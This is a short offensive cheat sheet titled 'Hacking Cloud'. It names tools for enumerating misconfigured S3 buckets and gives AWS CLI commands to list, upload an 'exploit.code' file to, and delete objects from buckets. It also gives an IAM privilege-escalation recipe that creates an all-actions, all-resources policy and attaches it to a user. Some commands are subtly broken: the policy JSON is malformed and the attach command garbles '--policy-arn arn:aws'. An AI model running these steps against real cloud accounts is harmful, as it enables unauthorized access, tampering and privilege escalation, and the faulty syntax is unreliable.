# Hacking Cloud

### Enumeration

1. LazyS3 --> Enumerate misconfigured S3 buckets
2. S3Scanner --> Another tool to enumerate S3 buckets

Other Tools

1. S3 Inspector
2. S3-buckets-bruteforcer
3. Mass3
4. Bucket Finder
5. s3recon

### Exploitation

In order to exploit the S3 buckets we need to have an active account on AWS and an AWSCLI tool installed.

We need to add the following information.

- AWS Access Key ID
- AWS Secret Access Key
- Default Region Name
- Default Output Format

--> Log into AWS --> Security Credentials --> Access Keys --> Create New Access Keys --> Show Access Keys --> Copy The Keys and Use Them


#### AWS CLI

```
AWS Configure --> Add the required information
```

```
aws s3 ls s3://bucketName
```

```
aws s3 mv exploit.code s3://bucketname
```

```
aws s3 rm s3://bucketname/exploit.code
```

#### Privilige Escalation using IAM Roles

```
nano getmehighprivs.json
```

```
{
	"Version":"Date"
	"Statement": [
		{
			"Effect":"Allow",
			"Action":"*",
			"Resource":"*"
		}
	]
}
```

```
aws iam create-policy --policy-name getmehighprivs --policy-document file://getmehighprivs.json
```

```
aws iam attach-user-policy --user-name batman --policy-am arm:aws:iam::<Account ID>:policy/getmehighprivs
```

```
aws iam list-attached-user-policies --user-name batman
```

```
aws iam list-users
```

```
aws s3api list-buckets --query "Buckets[].Name"
```

```
aws iam list-user-policies
```

```
aws iam list-role-policies
```

```
aws iam list-group-policies
```

```
aws iam create-user
```

